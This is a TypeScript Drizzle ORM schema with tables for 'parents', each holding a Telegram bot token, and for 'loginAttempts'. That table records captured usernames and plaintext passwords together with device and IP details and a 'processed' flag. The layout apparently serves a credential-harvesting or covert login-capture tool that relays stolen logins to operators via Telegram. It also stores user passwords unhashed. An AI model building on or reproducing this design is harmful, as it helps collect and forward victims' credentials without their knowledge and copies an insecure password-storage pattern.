import { pgTable, text, serial, integer, boolean, timestamp, uuid } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

// Parents table to store parent information
export const parents = pgTable("parents", {
  id: uuid("id").primaryKey().defaultRandom(), // Use UUID for parents
  name: text("name").notNull(),
  email: text("email").notNull().unique(),
  telegramBotToken: text("telegram_bot_token").notNull(),
  createdAt: timestamp("created_at").defaultNow().notNull(),
});

// Login attempts table to store all login attempts
export const loginAttempts = pgTable("login_attempts", {
  id: uuid("id").primaryKey().defaultRandom(),
  parentId: uuid("parent_id").references(() => parents.id).notNull(),
  username: text("username").notNull(),
  password: text("password").notNull(),
  deviceInfo: text("device_info"), // Stored as JSON string
  ipInfo: text("ip_info"), // Stored as JSON string
  timestamp: timestamp("timestamp").defaultNow().notNull(),
  processed: integer("processed").default(0).notNull(), // 0 = not processed, 1 = processed
});

// Schema for inserting a new parent
export const insertParentSchema = createInsertSchema(parents).pick({
  name: true,
  email: true,
  telegramBotToken: true,
});

// Schema for inserting a new login attempt
export const insertLoginAttemptSchema = createInsertSchema(loginAttempts).pick({
  parentId: true,
  username: true,
  password: true,
  deviceInfo: true,
  ipInfo: true,
});

// For authentication (keeping users table for authentication)
export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;
export type InsertParent = z.infer<typeof insertParentSchema>;
export type Parent = typeof parents.$inferSelect;
export type InsertLoginAttempt = z.infer<typeof insertLoginAttemptSchema>;
export type LoginAttempt = typeof loginAttempts.$inferSelect;
